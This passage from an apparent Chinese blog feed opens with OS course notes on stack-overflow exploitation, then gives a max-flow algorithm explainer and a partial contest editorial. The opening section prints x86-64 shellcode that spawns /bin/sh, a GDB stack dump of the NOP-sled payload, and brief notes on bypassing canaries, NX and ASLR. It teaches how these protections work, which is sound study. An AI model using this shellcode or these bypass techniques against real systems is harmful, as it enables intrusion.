  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Payload size: <span class="number">44</span> bytes</span><br><span class="line">Final size of c file: <span class="number">209</span> bytes</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x66\x68\x2d\x63\x54\x5e\x52\xe8\x08\x00\x00\x00\x2f\x62\x69&quot;</span></span><br><span class="line"><span class="string">&quot;\x6e\x2f\x73\x68\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05&quot;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<p>在 GDB 中运行，设置好断点后，通过 <code>run &lt; malice</code> 命令可以将输入重定向到我们的恶意代码。在 main() 函数返回之前，栈帧的数据如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7fffffffdd50:	0xffffde78	0x00007fff	0x555551a0	0x00000001</span><br><span class="line">0x7fffffffdd60:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffdd70:	0x41414141	0x41414141	0x41414141	0x41414141</span><br><span class="line">0x7fffffffdd80:	0x41414141	0x41414141	0xffffdd90	0x00007fff</span><br><span class="line">0x7fffffffdd90:	0x90909090	0x90909090	0x90909090	0x90909090</span><br><span class="line">0x7fffffffdda0:	0x90909090	0x90909090	0x622fb848	0x732f6e69</span><br><span class="line">0x7fffffffddb0:	0x50990068	0x66525f54	0x54632d68	0x08e8525e</span><br><span class="line">0x7fffffffddc0:	0x2f000000	0x2f6e6962	0x56006873	0x6a5e5457</span><br><span class="line">0x7fffffffddd0:	0x050f583b	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<p>可以看到 buf 前半部分都是 A，后面跟着我们的返回地址，一段 NOP sled 后是我们的恶意代码。</p>
<p>继续执行，可以看到执行了一堆 push,pop 之后，最核心的三句话为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push $0x3b</span><br><span class="line">pop $rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>0x3b 是 execve() 系统调用的系统调用号，执行到 syscall 后，GDB 会提示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">process 62464 is executing new program: /usr/bin/dash</span><br></pre></td></tr></table></figure>

<p>我们的 hack code 成功运行了一个其他程序。</p>
<h2 id="Stack-Canary"><a href="#Stack-Canary" class="headerlink" title="Stack Canary"></a>Stack Canary</h2><p>为了避免程序被过分容易地 hack，Linux 中有若干种栈溢出保护的机制。</p>
<p>Stack Canary (金丝雀) 的思路是：在创建栈帧时，在栈帧底部存放一个特殊的值，这个值被称为金丝雀，并在函数返回之前查看金丝雀是否改变。如果函数执行过程中发生了栈溢出，则金丝雀一定被覆盖了，一旦发现金丝雀被改变则直接报错。</p>
<p>对于之前的示例代码 <code>vuln.c</code>，如果我们在编译时不添加 <code>-fno-stack-protector</code>，观察反汇编结果，可以看到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000001189 &lt;main&gt;:</span><br><span class="line">1189:	f3 0f 1e fa          	endbr64 </span><br><span class="line">118d:	55                   	push   %rbp</span><br><span class="line">118e:	48 89 e5             	mov    %rsp,%rbp</span><br><span class="line">1191:	48 83 ec 40          	sub    $0x40,%rsp</span><br><span class="line">1195:	89 7d cc             	mov    %edi,-0x34(%rbp)</span><br><span class="line">1198:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)</span><br><span class="line">119c:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">11a3:	00 00 </span><br><span class="line">11a5:	48 89 45 f8          	mov    %rax,-0x8(%rbp)</span><br><span class="line">		......					......</span><br><span class="line">11cd:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx</span><br><span class="line">11d1:	64 48 2b 14 25 28 00 	sub    %fs:0x28,%rdx</span><br><span class="line">11d8:	00 00 </span><br><span class="line">11da:	74 05                	je     11e1 &lt;main+0x58&gt;</span><br><span class="line">11dc:	e8 9f fe ff ff       	call   1080 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">11e1:	c9                   	leave  </span><br><span class="line">11e2:	c3                   	ret    </span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>119c 行的命令 <code>mov %fs:0x28, %rax</code> 将一个“奇妙”的数值存入 rax 寄存器，紧接着 11a5 行将这个值保存在了 <code>rbp - 8</code> 的位置，这便是金丝雀。在函数返回之前，11cd 行将金丝雀取出并在 11d1,11da 行对其值进行检查，如果不匹配则会在 11dc 行跳转到函数 __stack_chk_fail() 中。</p>
<p>在打开 stack canary 的情况下，直接使用我们的 hack code，便会得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*** stack smashing detected ***: terminated</span><br><span class="line">Program received signal SIGABRT, Aborted.</span><br></pre></td></tr></table></figure>

<p>对抗金丝雀的技巧通常是利用一些读函数不遇到 <code>\0</code> 不停止的特性，把金丝雀的值泄漏出来，然后在进行栈溢出攻击的时候小心地处理金丝雀以骗过检查。</p>
<h2 id="Non-executable-Stack"><a href="#Non-executable-Stack" class="headerlink" title="Non-executable Stack"></a>Non-executable Stack</h2><p>Linux 打开了 non-executable stack 用于防御栈溢出攻击。栈对应的页面的 NX bit 会被打开，表示栈上的数据不可执行。对于之前的 <code>vuln.c</code>，如果我们在编译时不加入 <code>-z execstack</code> 选项，则默认栈对应的页面都有 NX bit。此时直接使用我们的 hack code，会在跳转到 NOP sled 执行第一条 nop 指令时直接触发段错误。</p>
<p>对抗 non-executable stack 的方法有 return-to-libc attack。攻击者将返回地址填写为 libc 库函数的地址，利用库函数语句来完成其攻击目的。在此基础上还有 ROP (return-oriented programming)，它不是利用完整的 libc 库函数，而是抓取多个靠近 <code>ret</code> 的零碎指令片段组合起来达到目的。</p>
<h2 id="Address-Space-Layout-Randomization-ASLR"><a href="#Address-Space-Layout-Randomization-ASLR" class="headerlink" title="Address Space Layout Randomization (ASLR)"></a>Address Space Layout Randomization (ASLR)</h2><p>Linux 默认打开 ASLR，如果我们反复执行 <code>./vuln</code> ，会发现每次栈的位置都不一样，这使得我们无法准确判定需要攻击的地址。之前提到的 NOP sled 是一种可能的对抗 ASLR 的方法。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Material</category>
      </categories>
  </entry>
  <entry>
    <title>几种求解最大流算法的通俗解释</title>
    <url>/2021/10/07/%E5%87%A0%E7%A7%8D%E6%9C%80%E5%A4%A7%E6%B5%81%E7%AE%97%E6%B3%95%E7%9A%84%E9%80%9A%E4%BF%97%E8%A7%A3%E9%87%8A/</url>
    <content><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>流：一个函数 $f: V\times V\rightarrow \mathbb{R}$，满足</p>
<ul>
<li>$0\leq f(u,v)\leq c(u,v)$</li>
<li>对于任意 $u\in V-{s,t}$，有流量守恒：$\sum_{v\in V} f(u,v)=\sum_{v\in V}f(v,u)$</li>
</ul>
<p>一个流 $f$ 的流量： $\mid f\mid=\sum_{v\in V} f(s,v)-\sum_{v\in V} f(v,s)$</p>
<p>预流：一个函数 $f:V\times V \rightarrow \mathbb{R}$，满足</p>
<ul>
<li>$0\leq f(u,v)\leq c(u,v)$</li>
<li>对于任意 $u\in V-{s,t}$，有 $\sum_{v\in V}f(v,u)\geq \sum_{v\in V}f(u,v)$（即进来的比出去的多）</li>
</ul>
<p>残余网络：残余网络中引入了反向边的概念，从而使退流成为可能，具体的，$c_f:V\times V\rightarrow \mathbb{R}$ 满足</p>
<p>$$<br>c_f(u,v)=<br>\begin{cases}<br>c(u,v)-f(u,v), &amp;(u,v)\in E\\<br>f(v,u), &amp;(v,u)\in E\\<br>0，&amp; otherwise<br>\end{cases}<br>$$割：割是图中点集的一个划分：$V=S\cup T$ ，满足 $S\cap T=\emptyset$ 且 $s\in S,t\in T$。</p>
<p>那么割的容量 $c(S,T)=\sum_{u\in S,v\in T}c(u,v)$。</p>
<p>一个流 $f$ 在割 $(S,T)$ 上的流量为 $f(S,T)=\sum_{u\in S,v\in T}f(u,v)-\sum_{v\in T,u,in S}f(v,u)$。可以理解对于任意割，$\mid f\mid=f(S,T)$。</p>
<span id="more"></span>

<h2 id="Ford-Fulkerson-方法"><a href="#Ford-Fulkerson-方法" class="headerlink" title="Ford-Fulkerson 方法"></a>Ford-Fulkerson 方法</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FORD-FULKERSON-METHOD(G, s, t)</span><br><span class="line">&#123;</span><br><span class="line">	initialize flow f to 0</span><br><span class="line">	while there exits an augmenting path p in the residual network Gf</span><br><span class="line">    	c = min&#123;c(u, v): (u,v) in in p&#125;</span><br><span class="line">    	foreach (u, v) in p</span><br><span class="line">    		if (u, v) in E</span><br><span class="line">    			(u, v).f += c</span><br><span class="line">    		else</span><br><span class="line">    			(v, u).f -= c</span><br><span class="line">    return f</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该算法不断在残余网络中寻找增广路并增广，直到残余网络“断了”（没有增广路）为止。</p>
<h3 id="对于反向边的直观理解"><a href="#对于反向边的直观理解" class="headerlink" title="对于反向边的直观理解"></a>对于反向边的直观理解</h3><p>对于反向边的直观理解是理解最大流算法的重要步骤之一。在这种基于不断寻找增广路的算法中，如果某条增广路 $p’:s\rightsquigarrow y\rightarrow x\rightsquigarrow t$ 经过了一条反向边 $y\rightarrow x$（即原边为 $x\rightarrow y$），那么之前一定也流过一条增广路 $p:s\rightsquigarrow x\rightarrow y\rightsquigarrow t$。那么走反向边相当于退流，不再走 $x\rightarrow y$ 并将这两条增广路拆开重新组合成另外两条增广路 $q:s\rightsquigarrow x\rightsquigarrow t$，$q’:s\rightsquigarrow y\rightsquigarrow t$。</p>
<h3 id="通俗的正确性理解"><a href="#通俗的正确性理解" class="headerlink" title="通俗的正确性理解"></a>通俗的正确性理解</h3><p>首先，设残余网络 $G_f$ 上的一个流为 $f’$，那么将两个流 $f$ 与 $f’$ 合成一个流，我们可以写出<br>$$<br>(f\uparrow f’)(u,v)=<br>\begin{cases}<br>f(u,v)+f’(u,v)-f’(v,u), &amp;(u,v)\in E\\<br>0, &amp;otherwise<br>\end{cases}<br>$$<br>可以证明，$(f\uparrow f’)$ 确实是一个流，且 $\mid f\uparrow f’\mid=\mid f\mid+\mid f’\mid$。这为 Ford-Fulkerson 将每次增广的流量加起来作为总流量提供了正确性保证。</p>
<p>Ford-Fulkerson 之所以得到了最大流取决于最大流最小割定理：</p>
<blockquote>
<p>(Max-flow min-cut Theorem) 以下三条等价：</p>
<ol>
<li>$f$ 是 $G$ 的最大流</li>
<li>残余网络 $G_f$ 中没有增广路</li>
<li>存在一个割 $(S,T)$ ，$\mid f\mid=c(S,T)$ </li>
</ol>
</blockquote>
<p>$1\rightarrow 2$ ：如果还有增广路，那么顺着增广路流一下，总流量就变大了，矛盾。</p>
<p>$2\rightarrow 3$：设 $s$ 能到达的点集为 $S$，剩余的为 $T$，显然有 $s\in S,t\in T$。那么对于任意一条边 $(u,v)\in E,u\in S,v\in T$，必然有 $f(u,v)=c(u,v)$，否则$(u,v)\in G_f$， $v$ 也会在 $S$ 中。</p>
<p>对于任意一条边 $(v,u)\in E,v\in T,u\in S$，必然有 $f(v,u)=0$，否则在残余网络中 $c_f(u,v)=f(v,u)\neq 0$，$v$ 也会在 $S$ 中。所以容易验证 $f(S,T)=c(S,T)$。</p>
<p>$3\rightarrow 1$：最大流显然是不超过最小割的。通俗理解，最大流中的每一份流量都要经过从 $S$ 到 $T$ 的过程，所以每一份容量都要占用割的容量。从数学角度，对于任意的割 $(S,T)$，<br>$$<br>\begin{align}<br>\mid f\mid &amp;= f(S,T)\\<br>&amp;= \sum_{u\in S,v\in T} f(u,v)-\sum_{v\in T,u\in S}f(v,u)\\<br>&amp;\leq \sum_{u\in S,v\in T} f(u,v)\\<br>&amp;\leq \sum_{u\in S,v\in T} c(u,v)\\<br>&amp;=c(S,T)<br>\end{align}<br>$$<br>又因为现在找到了一个流等于某个最小割，所以该流一定是最大流。</p>
<h3 id="通俗的复杂度分析"><a href="#通俗的复杂度分析" class="headerlink" title="通俗的复杂度分析"></a>通俗的复杂度分析</h3><p>假设将 Ford-Fulkerson 运用于整数容量的网络。则每次增广至少增加 $1$ 的流量。每次寻找增广路需要对图做一次搜索，所以 Ford-Fulkerson 的最坏时间复杂度为 $O(\mid f\mid E)$。</p>
<h3 id="Edmonds-Karp-算法"><a href="#Edmonds-Karp-算法" class="headerlink" title="Edmonds-Karp 算法"></a>Edmonds-Karp 算法</h3><p>Ford-Fulkerson 之所以被称为 “方法” 是因为它没有明确给出找一条增广路的方式。Edmonds-Karp 是一种基于 Ford-Fulkerson 方法的算法，它给出了一种具体的找增广路的方式，从而使理论最坏复杂度降低到 $O(VE^2)$。</p>
<p>Edmonds-Karp 找增广路的方法是：将残余网络每条边的边权看作1做一次 bfs，然后沿着从 $s$ 到 $t$ 经过边数最少的路来增广。</p>
<p>可以证明：在增广的过程中，源点 $s$ 到每个点的最短距离是单调不降的：</p>
<blockquote>
<p>考虑反证法：假设在做完流$f$ 时还满足条件，但在做完 $f’$ 之后有节点的最短距离变短了，设 $v$ 是满足 $\delta_{f’}(s,v)&lt;\delta_f(s,v)$ 且 $\delta_{f’}(s,v)$ 最小的点 $v$。显然 $v\neq s$，那么设在残余网络 $E_{f’}$ 中 $s$ 到 $v$ 的一条最短路径为 $s\rightsquigarrow u\rightarrow v$，则 $\delta_{f’}(s,u)=\delta_{f’}(s,v)-1$。根据之前 $v$ 的找法，必然有 $\delta_{f’}(s,u)\geq \delta_f(s,u)$。因此 $\delta_f(s,u)\leq \delta_{f’}(s,u)&lt;\delta_{f’}(s,v)&lt;\delta_f(s,v)$。连续的两个小于号意味着 $\delta_f(s,u)&lt;\delta_f(s,v)-1$，所以在 $E_f$ 中必然没有 $(u,v)$ 这条边。</p>
<p>$E_f$ 中没有 $(u,v)$ 而 $E_{f’}$ 中有 $(u,v)$ ，这说明流 $f’$ 必然沿着 $(v,u)$ 增广了，所以有 $\delta_f(s,u)=\delta_f(s,v)+1$。这与之前的 $\delta_f(s,u)&lt;\delta_f(s,v)$ 矛盾。$\blacksquare$</p>
</blockquote>
<p>对于每一条增广路，至少存在一条边的残余容量与增广路流量 $f$ 相同。我们称这条边 $(u,v)$ 为关键边。关键边在增广后会残余网络中消失，如果它要再次出现，需要在某一条流 $f’$ 中沿着反向边再增广一次。我们考虑每一条边有多少次机会成为关键边：$\delta_{f’}(s,u)=\delta_{f’}(s,v)+1\geq \delta_f(s,v)+1=\delta_f(s,u)+2$。即一条边 $(u,v)$ 成为关键边后如果再出现在图中，$\delta(s,u)$ 至少增加了2。又每个点的 $\delta$ 值不超过 V，所以一条边成为关键边的次数是 $O(V)$ 的。所以总关键边边次是 $O(VE)$。每条增广路至少包含一条关键边，所以增广次数最多是 $O(VE)$ 的。每次增广需要做一遍 bfs，所以最坏时间复杂度为 $O(VE^2)$。</p>
<h2 id="预流推进-Push-relabel-方法"><a href="#预流推进-Push-relabel-方法" class="headerlink" title="预流推进 (Push-relabel) 方法"></a>预流推进 (Push-relabel) 方法</h2><h3 id="基本流程-1"><a href="#基本流程-1" class="headerlink" title="基本流程"></a>基本流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUSH(u, v)</span><br><span class="line">&#123;</span><br><span class="line">	# Applies when u is overflowing, cf(u, v)&gt;0 and u.h = v.h + 1</span><br><span class="line">	t(u, v) = min(u.e, cf(u, v))</span><br><span class="line">	if (u, v) in E</span><br><span class="line">		(u, v).f += t(u, v)</span><br><span class="line">	else</span><br><span class="line">		(v, u).f -= t(u, v)</span><br><span class="line">	u.e -= t(u, v)</span><br><span class="line">	v.e += t(u, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RELABEL(u)</span><br><span class="line">&#123;</span><br><span class="line">	# Applies when u is overflowing and for all v in u.adj, u.h &lt;= v.h</span><br><span class="line">	u.h = 1 + min&#123;v.h: (u, v) in Ef&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">INITIALIZE-PREFLOW(G, s)</span><br><span class="line">&#123;</span><br><span class="line">	foreach v in G.V: v.h = v.e = 0 # v.h -&gt; v&#x27;s height; v.e -&gt; v&#x27;s overflow volume</span><br><span class="line">	foreach (u, v) in G.E: (u, v).f = 0</span><br><span class="line">	s.h = G.V.size</span><br><span class="line">	foreach v in s.adj</span><br><span class="line">		(s, v).f = c(s, v)</span><br><span class="line">		v.e = c(s, v)</span><br><span class="line">		s.e -= c(s, v)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">GENERIC-PUSH-RELABEL(G)</span><br><span class="line">&#123;</span><br><span class="line">	INITIALIZE-PREFLOW(G, s)</span><br><span class="line">	while there exists an applicable push or relabel operation</span><br><span class="line">		select an applicable push or relabel operation and perform it</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>预流推进方法和增广路方法的思路很不一样：增广路方法在过程中始终保证流量平衡，而预流推进则不然：它在每个节点后面都设置了一个储水罐，先把尽可能多的水流到该节点存在储水罐中，此时该节点的进水量大于出水量，称该状态为 overflow 状态。该节点想办法尽可能把储水罐里的水流出去，实在流不出去的再顺着原路退回去。</p>
<p>预流推进的另一套重要机制是每个节点的高度函数。高度函数 $h: V\rightarrow \mathbb{R}$ 满足 $h(t)=0$ 且任意 $(u,v)\in G_f$，$u.h\leq v.h+1$。高度函数类似于模拟了“水往低处流”的原理。节点 $u$ 的水可以流向节点 $v$ (PUSH) 当且仅当 $u.h=v.h+1$。</p>
<p>有的时候水可能存在一个低洼的节点中流不出去，这时候就要抬高这个节点的高度——把它抬得比相邻的节点中最最低的那个高 1 水就能流过去了。这就是 RELABEL 的过程。</p>
<p>流进 $t$ 的水不算 overflow，因为 $t$ 本身就是汇点。那些预先从 $s$ 流出去但发现灌不下去的水，会随着中间节点高度的抬高流回到 $s$。</p>
<h3 id="对于反向边的直观理解-1"><a href="#对于反向边的直观理解-1" class="headerlink" title="对于反向边的直观理解"></a>对于反向边的直观理解</h3><p>节点 $u$ 从它的上家收集了大量的水，暂存在 $u$ 背后的储水罐里。但 $u$ 发现这些水并不能全部灌到 $u$ 的下家去，所以 $u$ 把多余的水退还给了自己的上家。即上家不应该把这么多水丢给 $u$ 这个出口量很小的下家，而应该把更多的水分配给那些出口量很大但还没“吃饱”的其他下家，或者上家可以将这些多余的水继续退还给上家的上家。</p>
<h3 id="通俗的正确性理解-1"><a href="#通俗的正确性理解-1" class="headerlink" title="通俗的正确性理解"></a>通俗的正确性理解</h3><p>一件比较显然的事情是如果网络中存在 overflow 的节点，那么算法一定不会结束。因为对于该 overflow 节点，如果有边 PUSH 则会 PUSH，如果没边 PUSH 一定可以 RELABEL。</p>
<p>我们简单地说明在预流推进的过程中，$h$ 始终满足高度函数的性质：</p>
<ul>
<li>对于 PUSH 操作，它可能使边 $(u,v)$ 消失，可能使边 $(v,u)$ 出现。边消失意味着约束条件变少，显然没问题。因为 PUSH 的时候 $u.h&gt;v.h$，所以 $(v,u)$ 边的存在也不会导致问题。</li>
<li>对于 RELABEL(u) 操作，因为它的高度只是比相邻的最低的节点恰好多 1，所以从 $u$ 出发的边不会出现问题。那些指向 $u$ 的节点，因为 $u.h$ 是在变大，所以也不会出现问题。</li>
</ul>
<p>另外一件比较显然的事情是残余网络中始终不存在从 $s$ 到 $t$ 的通路。从直观角度理解，刚开始我们已经尽可能把水从 $s$ 全灌出去了，所以接下来的事情是把水尽可能多地灌到 $t$，不会再有水需要补充进来。从数学角度来看，在基于上面的高度函数的性质的基础上也不难理解：因为 $s.h=V,t.h=0$ 不会变化，所以如果存在通路，那么这条通路要包含 $V+1$ 个点 (高度函数的约束)，显然不可能。</p>
<p>因此，我们可以用如下循环不变式来证明其正确性：</p>
<blockquote>
<p>GENERIC-PUSH-RELABEL() 的每次循环开始时，$f$ 都是一个预流。</p>
</blockquote>
<p>该不变式的 Initialization 和 Maintenance 都比较容易说明。着重说明 Termination: 当循环结束，即无法做 PUSH 也无法做 RELABEL 时，必然没有节点 overflow，所以预流 $f$ 就是一个流。此时 $h$ 仍是一个高度函数，这在数学上帮我们保证了从 $s$ 到 $t$ 没有通路，因此此时 $f$ 等于某一个割的容量，根据最大流最小割定理，此时的 $f$ 就是最大流。</p>
<h3 id="通俗的复杂度分析-1"><a href="#通俗的复杂度分析-1" class="headerlink" title="通俗的复杂度分析"></a>通俗的复杂度分析</h3><p>比较容易看出来每个顶点的高度值不会超过 $2\mid V\mid$。每次RELABEL一定会有一个节点的高度值增加，所以RELABEL 的次数不超过 $O(V^2)$。每次 RELABEL 之后，可以感性地理解最多 $O(E)$ 次 PUSH 之后就没的可 PUSH 了，所以最坏时间复杂度为 $O(V^2E)$。</p>
<h3 id="Relabel-to-front-算法"><a href="#Relabel-to-front-算法" class="headerlink" title="Relabel-to-front 算法"></a>Relabel-to-front 算法</h3><p>和 Ford-Fulkerson 方法类似，Push-Relabel 也是一个方法，因为它没有指明按照什么样的顺序进行 PUSH 和 RELABEL。Relabel-to-front 算法规定了一种 PUSH, RELABEL 的顺序，使最坏时间复杂度降到 $O(V^3)$。</p>
<p>Relabel-to-front 方法定义了一个 DISCHARGE 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DISCHARGE(u)</span><br><span class="line">while u.e &gt; 0</span><br><span class="line">	v = u.current</span><br><span class="line">	if v == NIL</span><br><span class="line">		RELABEL(u)</span><br><span class="line">		u.current = u.N.head</span><br><span class="line">	elseif cf(u,v) &gt; 0 and u.h == v.h + 1</span><br><span class="line">		PUSH(u, v)</span><br><span class="line">	else u.current = v.next-neighbor</span><br></pre></td></tr></table></figure>

<p>其中 $u$ 的所有相关的邻居（进边和出边）以链表的形式存在 $u.N$ 中。DISCHARGE 函数的内涵就是不停地 PUSH，没得 PUSH 就 RELABEL 之后再 PUSH，直到把 $u$ 里面的存水全部灌出去。</p>
<p>Relabel-to-front 算法的主函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RELABEL-TO-FRONT(G, s, t)</span><br><span class="line">INITIALIZE-PREFLOW(G, s)</span><br><span class="line">L = G.V - &#123;s, t&#125;, in any order</span><br><span class="line">foreach u in G.V - &#123;s, t&#125;</span><br><span class="line">	u.current = u.N.head</span><br><span class="line">u = L.head</span><br><span class="line">while u != NIL</span><br><span class="line">	old-height = u.h</span><br><span class="line">	DISCHARGE(u)</span><br><span class="line">	if u.h &gt; old-height</span><br><span class="line">		move u to the front of list L</span><br><span class="line">	u = u.next</span><br></pre></td></tr></table></figure>

<p>我们定义所有满足 $u.h=v.h+1$ 的边 $(u,v)$ 为可流边，则可流边组成了一个DAG。我们设立循环不变式：</p>
<blockquote>
<p>每次循环开始时， $L$ 中的序列都满足可流边DAG的偏序关系，且 $u$ 之间的节点没有 overflow。</p>
</blockquote>
<p>简单描述 Maintenance 部分：先考虑前半部分：如果当前节点 $u$ 没有被 RELABEL，那么仅仅 PUSH 显然不会产生新的可流边。如果 $u$ 被 RELABEL 了，那么可以证明 $u$ 此时没有可流入边。因为如果存在 $(v,u)$ 是可流入边，那么 RELABEL 之后 $v.h=u.h+1$，那么 RELABEL 之前 $v.h&gt;u.h+1$ ，与高度函数的定义不符。所以把 $u$ 提到最前面是安全的。</p>
<p>再考虑后半部分：如果 $u$ 被 RELABEL 了，那么 $u$ 被提到了最前面，显然没问题。如果 $u$ 没被 RELABEL，那么 $u$ PUSH 的时候只能把水灌到 $L$ 中在 $u$ 之后的节点中（偏序关系），所以 $u$ 之前的节点不会出问题。</p>
<p>因此 Relabel-to-front 算法的正确性有保证。可以证明，它的最坏时间复杂度为 $O(V^3)$。</p>
]]></content>
      <tags>
        <tag>网络流</tag>
        <tag>算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>牛客2021多校 Round3 题解</title>
    <url>/2021/08/18/%E7%89%9B%E5%AE%A22021%E5%A4%9A%E6%A0%A1%20Round3%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-Guess-and-Lies"><a href="#A-Guess-and-Lies" class="headerlink" title="A. Guess and Lies"></a>A. Guess and Lies</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li><a href="https://ac.nowcoder.com/acm/contest/18900/A">传送门</a></li>
<li>Alice 和 Bob 玩游戏，Alice 想好一个 $1$ 到 $n$ 之间的整数，Bob 每次可以给出一个 $x$ ，并问 Alice 她想的数是否大于等于 $x$ ，Alice 可以回答 <code>Yes</code>或 <code>No</code>。Alice 在游戏全程有一次撒谎的机会，她可以选择在任意时刻使用这次机会。现问：在 Bob 第一次问的 $x$ 是 $1,2,3,…,n$​ 且 Alice 回答了 <code>Yes</code>（可能撒谎）的情况下，Bob 各最少需要多少次才能确定 Alice 想的数。</li>
<li>$n\leq 2000$​。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>转换思路考虑这个问题：如果某一次对于 Bob 提出的 $x$ Alice 回答了 Yes，那么如果 Alice 想的数小于 $x$ ，则她的撒谎次数+1。进而我们发现：对于一系列的 Bob 提问 Alice 回答的操作之后的局面，我们可以对每一个数 $i$ 记一个 $a_i$ 表示如果 Alice 想的数是 $i$ ，她目前撒谎了多少次，根据之前的提问回答每一个 $a_i$ 都是确定的。当且仅当只有一个 $a_i\leq 1$ 时，Bob 就可以确定 Alice 想的数。因此游戏转化为：每次 Bob 选一个分界点，Alice可以选择将分界点的前一半+1或后一半+1，Bob 希望尽快让数列中只有一个数 $\leq 1$，Alice则相反，问 Bob 需要问多少次。</p>
<p>直接维护 $a$ 数组的状态是困难的，但我们发现一个性质：在若干次操作后，$a$ 序列中那些 $\leq 1$ 的数一定是一段1，然后一段0，然后一段1（段与段不一定相邻，用数学归纳法此结论易证）。因此我们用 $dp[i][j][k]$ 表示第一段 $i$ 个 $1$，第二段 $j$ 个 $0$，第三段 $k$ 个 $1$ 的情况下需要多少次结束游戏，转移暴力枚举 Bob 选择的分界点，这样总时间复杂度为 $O(n^4)$，不足以通过。</p>
<p>我们进而可以发现该dp具有决策单调性：即在固定 $i$ 和 $j$ 的情况下，随着 $k$ 的增长，对 Bob 最优的分界点一定也是递增的（因为后面的 $1$ 变多了）。利用决策单调性优化可以优化到 $O(n^3)$，仍然不足以通过。</p>
<p>考虑继续对dp进行优化。我们考虑一种Bob的策略：Bob每轮连续两次问同一个数，如果 Alice 两次回答结果相同则没有撒谎，如果回答结果不同则撒谎了，这样每问两次 Bob 就可以将区间长度缩小一般，因此 Bob 一定能在 $2logn$​ 次以内确定答案，也就是说，dp数组内存储的值都是log级别的，非常小。进而我们发现dp值与dp下标之间也存在单调性，即固定 $i$, $j$ 不动时，随着 $k$ 的增大，dp值不会减少（因为后面的 $1$ 变多了）。因此我们考虑交换dp的第三维与答案，重新设计状态。</p>
<p>令 $dp[t][i][j]$ 表示中间的 $0$ 有 $i$ 个，左边或右边（具有对称性）的某一段 $1$ 有 $j$ 个，Bob使用不超过 $k$ 次猜测能结束游戏的前提下，另一段 $1$ 至多能有多少个。转移相对复杂，仍然是考虑分界点的位置，但充分利用单调性，每次将答案标记在最大的位置上并在每轮最后取一个后缀max，核心代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rep</span>(t,<span class="number">0</span>,<span class="number">20</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">rep</span>(i,<span class="number">0</span>,n) <span class="built_in">rep</span>(j,<span class="number">0</span>,i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k=dp[t][j][i-j],w=dp[t][i-j][j];</span><br><span class="line">        <span class="keyword">if</span> (k&gt;=<span class="number">0</span>) <span class="built_in">check_max</span>(dp[t+<span class="number">1</span>][i][<span class="built_in">min</span>(k,n-i)],w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">rep</span>(i,<span class="number">0</span>,n) <span class="keyword">if</span> (dp[t][<span class="number">0</span>][i]!=<span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">rep</span>(j,<span class="number">0</span>,n-i) <span class="keyword">if</span> (dp[t][i][j]!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> k=dp[t][i][j];</span><br><span class="line">        <span class="built_in">check_max</span>(dp[t+<span class="number">1</span>][i][<span class="built_in">min</span>(k,n-i)],dp[t][<span class="number">0</span>][i]+j);</span><br><span class="line">        <span class="built_in">check_max</span>(dp[t+<span class="number">1</span>][i][<span class="built_in">min</span>(dp[t][<span class="number">0</span>][i]+j,n-i)],k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">rep</span>(i,<span class="number">0</span>,n) <span class="built_in">REP</span>(j,n-i<span class="number">-1</span>,<span class="number">0</span>) <span class="built_in">check_max</span>(dp[t+<span class="number">1</span>][i][j],dp[t+<span class="number">1</span>][i][j+<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> 总时间复杂度为 $O(n^2logn)$，可以通过。</p>
<h2 id="B-Black-and-White"><a href="#B-Black-and-White" class="headerlink" title="B. Black and White"></a>B. Black and White</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
